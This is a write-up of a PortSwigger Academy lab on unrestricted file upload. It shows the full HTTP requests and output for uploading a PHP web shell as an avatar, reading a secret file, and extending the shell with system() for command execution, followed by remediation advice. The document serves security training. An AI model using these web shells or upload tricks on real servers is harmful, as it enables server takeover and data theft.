# Remote code execution via web shell upload

**Category:** File upload
**Level:** Apprentice
**Mechanism:** Unrestricted file upload → PHP web shell → RCE

**Lab URL:** https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload

---

## Vulnerability

The avatar upload performs **no validation** on the uploaded file and stores it in a
web-accessible directory where the server executes PHP. So an attacker uploads a `.php`
file and requests it, and the server runs the attacker's code — full remote code
execution with the web process's privileges.

## Reconnaissance & Exploitation

Uploading a normal image showed the flow: `POST /my-account/avatar` stored the file and
it was served back from `GET /files/avatars/<name>`. That directory is web-accessible
and the stack is PHP (`Server: Apache/2.4.41 (Ubuntu)`), so a `.php` uploaded there will
execute on request.

I uploaded a one-line PHP web shell as the avatar — filename `myexploit.php`, body
reading the target file. (`Content-Type: image/jpeg` was left in the part, but nothing
checks it.)

```http
POST /my-account/avatar HTTP/2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="avatar"; filename="myexploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary...
```

```http
HTTP/2 200 OK
The file avatars/myexploit.php has been uploaded.
```

Then I requested the uploaded file directly. The server executed the PHP and returned
the output — carlos's secret:

```http
GET /files/avatars/myexploit.php HTTP/2
Host: 0a5000b003f7479582bb99b400770045.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Length: 32

gy7DqPMaD8qv5Of77qYZH9w4BaxbAjjT
```

Submitting the secret solved the lab. The same shell reads any file the web user can
(`/etc/passwd` confirmed too), or runs arbitrary commands with `system()` — this is full
RCE, not just file read.

## Impact

Arbitrary code execution on the server as the web process. From a profile-picture field,
an attacker reads any readable file (secrets, config, keys), runs system commands,
establishes a reverse shell, and pivots into the internal network. This is among the
highest-severity web findings — a direct server compromise, not just data exposure.

## Remediation

- Validate uploads by content, not trust: verify the file is actually an image
  (magic bytes / image library), and enforce an **allowlist** of safe extensions.
- Store uploads outside the web root, or in a location configured **not to execute**
  scripts (no PHP handler), and serve them through a handler that sets a safe
  `Content-Type` and `Content-Disposition: attachment`.
- Rename uploaded files to a random server-generated name with a validated extension;
  never keep the user-supplied filename/extension.
- Run the upload/serving component with least privilege so even code execution is
  contained.

## References

- **OWASP:** A05:2021 Security Misconfiguration (also OWASP "Unrestricted File Upload")
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)

## Notes

- Two conditions must both hold for upload→RCE: (1) the server stores a file whose
  extension it will execute, and (2) that file is reachable and executed from the web
  root. Break either and RCE fails — later labs attack the filters that try to do that.
- `Content-Type: image/jpeg` in the multipart part is attacker-controlled and was
  ignored here — never rely on it for validation.
- Web shell escalation: `file_get_contents()` reads files; `system($_GET['cmd'])` turns
  the same upload into interactive command execution.